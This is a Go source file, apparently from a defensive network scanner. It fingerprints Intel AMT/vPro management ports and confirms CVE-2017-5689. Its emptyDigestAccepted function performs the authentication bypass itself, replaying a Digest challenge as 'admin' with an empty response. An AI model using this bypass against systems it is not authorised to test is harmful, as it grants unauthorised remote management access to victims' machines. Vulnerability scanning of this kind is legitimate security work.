// Package amt probes Intel AMT / vPro endpoints and actively verifies the
// CVE-2017-5689 (INTEL-SA-00075) authentication bypass: AMT's web server compares
// the client's HTTP Digest response with strncmp() over the CLIENT-supplied
// length, so an empty response="" matches any account and authenticates. This is
// confirmed on the wire (a protected page flips 401 -> 200), not inferred from
// the version banner. /wsman Identify metadata is exposed even on patched boxes.
package amt

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

// CleartextPort is AMT's non-TLS management port.
const CleartextPort = 16992

// TLSPort is AMT's HTTPS management port.
const TLSPort = 16993

// Result captures AMT pre-auth data.
type Result struct {
	Host            string
	Cleartext       bool
	TLS             bool
	Present         bool // an AMT management server answered on 16992/16993
	Port            int
	HTTPStatus      int
	ServerHdr       string
	DetectionSource string
	Fingerprint     string
	Version         string
	VersionSource   string
	VersionInRange  bool   // Version falls in the CVE-2017-5689 affected 6.0-11.6 band
	AuthBypass      bool   // empty-digest replay authenticated (CVE-2017-5689)
	BypassPort      int    // port the bypass was confirmed on
	BypassPath      string // the Digest-protected path that flipped 401 -> 200
	BypassRealm     string // the device-reported Digest realm accepted with an empty response
	Body            string
}

var amtVersionRe = regexp.MustCompile(`(?i)(?:technology|standard\s+manageability|amt)\s*([0-9]+(?:\.[0-9]+){1,3})`)

// Probe hits 16992/16993 and fingerprints AMT (presence + version). It does not
// attempt the auth bypass; call VerifyEmptyDigest for the active confirmation.
func Probe(host string, timeout time.Duration) (*Result, error) {
	client := httpx.Client(timeout)
	r := &Result{Host: host}

	for _, ep := range []struct {
		URL   string
		Base  string
		isTLS bool
	}{
		{"http://" + netaddr.URLHostPort(host, 16992) + "/", "http://" + netaddr.URLHostPort(host, 16992), false},
		{"https://" + netaddr.URLHostPort(host, 16993) + "/", "https://" + netaddr.URLHostPort(host, 16993), true},
	} {
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		req, err := http.NewRequestWithContext(ctx, "GET", ep.URL, nil)
		if err != nil { // malformed URL (e.g. an unbracketed IPv6 host) - never Do(nil)
			cancel()
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			cancel()
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		resp.Body.Close()
		cancel()
		s := string(body)
		server := resp.Header.Get("Server")
		if detectionSource, fingerprint, ok := amtFingerprint(server, s); ok {
			r.Present = true
			if r.Port == 0 {
				r.Port = CleartextPort
				if ep.isTLS {
					r.Port = TLSPort
				}
				r.HTTPStatus = resp.StatusCode
				r.DetectionSource = detectionSource
				r.Fingerprint = fingerprint
				r.ServerHdr = server
			}
			if r.Body == "" {
				r.Body = s
			}
			if v := extractVersionFromServer(server); v != "" {
				if r.Version == "" {
					r.Version = v
					r.VersionSource = "http_server"
				}
			} else if v := extractVersion(s); v != "" {
				if r.Version == "" {
					r.Version = v
					r.VersionSource = "http_body"
				}
			} else if v := extractVersionLoose(s); v != "" {
				if r.Version == "" {
					r.Version = v
					r.VersionSource = "http_body_fuzzy"
				}
			}
			if r.Version == "" {
				if v, src := probeAMTVersionPaths(client, ep.Base, timeout); v != "" {
					r.Version = v
					r.VersionSource = src
				}
			}
			if ep.isTLS {
				r.TLS = true
			} else {
				r.Cleartext = true
			}
		}
	}
	r.VersionInRange = r.Version != "" && vulnerable20175689(r.Version)
	return r, nil
}

func probeAMTVersionPaths(client *http.Client, base string, timeout time.Duration) (string, string) {
	for _, p := range []string{"/index.htm", "/logon.htm", "/remote.htm"} {
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		req, err := http.NewRequestWithContext(ctx, "GET", base+p, nil)
		if err != nil {
			cancel()
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			cancel()
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		resp.Body.Close()
		cancel()
		server := resp.Header.Get("Server")
		if v := extractVersionFromServer(server); v != "" {
			return v, "http_server_path"
		}
		s := string(body)
		if v := extractVersion(s); v != "" {
			return v, "http_body_path"
		}
		if v := extractVersionLoose(s); v != "" {
			return v, "http_body_fuzzy_path"
		}
	}
	return "", ""
}

// VerifyEmptyDigest actively confirms CVE-2017-5689 against a fingerprinted AMT
// box: it requests a Digest-protected page, then replays the challenge with an
// empty response="" field. A vulnerable AMT authenticates (200); a patched one
// re-challenges (401). It sets r.AuthBypass/BypassPort on success. This is an
// active login attempt, so callers gate it behind an online/creds flag.
func VerifyEmptyDigest(r *Result, timeout time.Duration) {
	client := httpx.ClientWithRedirect(timeout, func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse })
	type ep struct {
		base string
		port int
		on   bool
	}
	for _, e := range []ep{
		{"http://" + netaddr.URLHostPort(r.Host, 16992), 16992, r.Cleartext},
		{"https://" + netaddr.URLHostPort(r.Host, 16993), 16993, r.TLS},
	} {
		if !e.on {
			continue
		}
		if ok, path, realm := emptyDigestAccepted(client, e.base, timeout); ok {
			r.AuthBypass = true
			r.BypassPort = e.port
			r.BypassPath = path
			r.BypassRealm = realm
			return
		}
	}
}

// emptyDigestAccepted requests a protected AMT page and replays the Digest
// challenge with an empty response. On success it returns true plus the path that
// flipped 401 -> 200 and the device-reported Digest realm, so the caller can emit
// device-sourced proof of the confirmed bypass.
func emptyDigestAccepted(client *http.Client, base string, timeout time.Duration) (ok bool, path, realm string) {
	// AMT's management pages (index, hardware inventory, remote control) are
	// Digest-protected; index.htm challenges first.
	for _, p := range []string{"/index.htm", "/hw-sys.htm", "/remote.htm"} {
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		req, err := http.NewRequestWithContext(ctx, "GET", base+p, nil)
		if err != nil {
			cancel()
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			cancel()
			continue
		}
		ch := resp.Header.Get("WWW-Authenticate")
		_ = resp.Body.Close()
		cancel()
		if resp.StatusCode != http.StatusUnauthorized || !strings.HasPrefix(strings.ToLower(strings.TrimSpace(ch)), "digest") {
			continue // not a Digest-protected resource
		}
		rlm, nonce, qop := digestField(ch, "realm"), digestField(ch, "nonce"), digestField(ch, "qop")
		// Craft a well-formed Digest header for user "admin" with response="".
		auth := fmt.Sprintf(`Digest username="admin", realm=%q, nonce=%q, uri=%q, response=""`, rlm, nonce, p)
		if qop != "" {
			auth += `, qop=auth, nc=00000001, cnonce="0a4f113b"`
		}
		ctx2, cancel2 := context.WithTimeout(context.Background(), timeout)
		req2, err := http.NewRequestWithContext(ctx2, "GET", base+p, nil)
		if err != nil {
			cancel2()
			continue
		}
		req2.Header.Set("Authorization", auth)
		resp2, err := client.Do(req2)
		cancel2()
		if err != nil {
			continue
		}
		_ = resp2.Body.Close()
		if resp2.StatusCode == http.StatusOK {
			return true, p, rlm // empty response accepted -> auth bypass confirmed
		}
	}
	return false, "", ""
}

// digestField extracts a single token from a WWW-Authenticate: Digest header,
// e.g. digestField(`Digest realm="X", nonce="Y"`, "nonce") == "Y".
func digestField(header, key string) string {
	i := strings.Index(strings.ToLower(header), strings.ToLower(key)+"=")
	if i < 0 {
		return ""
	}
	v := header[i+len(key)+1:]
	if len(v) > 0 && v[0] == '"' {
		if end := strings.IndexByte(v[1:], '"'); end >= 0 {
			return v[1 : 1+end]
		}
	}
	end := strings.IndexAny(v, ", ")
	if end < 0 {
		end = len(v)
	}
	return strings.TrimSpace(v[:end])
}

// isAMT reports whether a response came from an Intel AMT / vPro management
// server, using either the Server header or the well-known body marker.
func isAMT(server, body string) bool {
	_, _, ok := amtFingerprint(server, body)
	return ok
}

func amtFingerprint(server, body string) (source, fingerprint string, ok bool) {
	markers := []struct {
		needle string
		label  string
	}{
		{"intel(r) active management technology", "Intel(R) Active Management Technology"},
		{"intel active management technology", "Intel Active Management Technology"},
		{"intel(r) active management", "Intel(R) Active Management"},
		{"intel active management", "Intel Active Management"},
		{"active management technology", "Active Management Technology"},
		{"intel(r) standard manageability", "Intel(R) Standard Manageability"},
		{"intel standard manageability", "Intel Standard Manageability"},
		{"intel(r) amt", "Intel(R) AMT"},
		{"intel amt", "Intel AMT"},
	}
	for _, candidate := range []struct {
		source string
		value  string
	}{{"http_server", server}, {"http_body", body}} {
		value := strings.ToLower(candidate.value)
		for _, marker := range markers {
			if strings.Contains(value, marker.needle) {
				return candidate.source, marker.label, true
			}
		}
	}
	return "", "", false
}

// extractVersionFromServer pulls the AMT firmware version out of the Server
// header, e.g. "Intel(R) Active Management Technology 11.8.50" -> "11.8.50" or
// "Intel(R) AMT 9.0.30" -> "9.0.30".
func extractVersionFromServer(server string) string {
	for _, marker := range []string{"Technology ", "Standard Manageability ", "AMT "} {
		if _, after, ok := strings.Cut(server, marker); ok {
			tail := after
			end := strings.IndexAny(tail, " ;\r\n")
			if end < 0 {
				end = len(tail)
			}
			cand := strings.TrimSpace(tail[:end])
			// Guard against matching a trailing "AMT" with no version.
			if len(cand) > 0 && cand[0] >= '0' && cand[0] <= '9' {
				return cand
			}
		}
	}
	return ""
}

func extractVersion(body string) string {
	// "Intel(R) Active Management Technology 11.8.50" style.
	_, after, ok := strings.Cut(body, "Technology ")
	if !ok {
		return ""
	}
	tail := after
	end := strings.IndexAny(tail, " <\r\n")
	if end < 0 {
		end = len(tail)
	}
	if end > 32 {
		end = 32
	}
	return strings.TrimSpace(tail[:end])
}

func extractVersionLoose(s string) string {
	m := amtVersionRe.FindStringSubmatch(s)
	if len(m) == 2 {
		return strings.TrimSpace(m[1])
	}
	return ""
}

func vulnerable20175689(ver string) bool {
	// Affected: 6.0.x through 11.6.x (inclusive).
	major, minor := parseVer(ver)
	if major < 6 {
		return false
	}
	if major < 11 {
		return true
	}
	if major == 11 && minor <= 6 {
		return true
	}
	return false
}

func parseVer(s string) (int, int) {
	var maj, min int
	before, after, ok := strings.Cut(s, ".")
	if !ok {
		return 0, 0
	}
	for _, c := range before {
		if c >= '0' && c <= '9' {
			maj = maj*10 + int(c-'0')
		}
	}
	tail := after
	for _, c := range tail {
		if c < '0' || c > '9' {
			break
		}
		min = min*10 + int(c-'0')
	}
	return maj, min
}
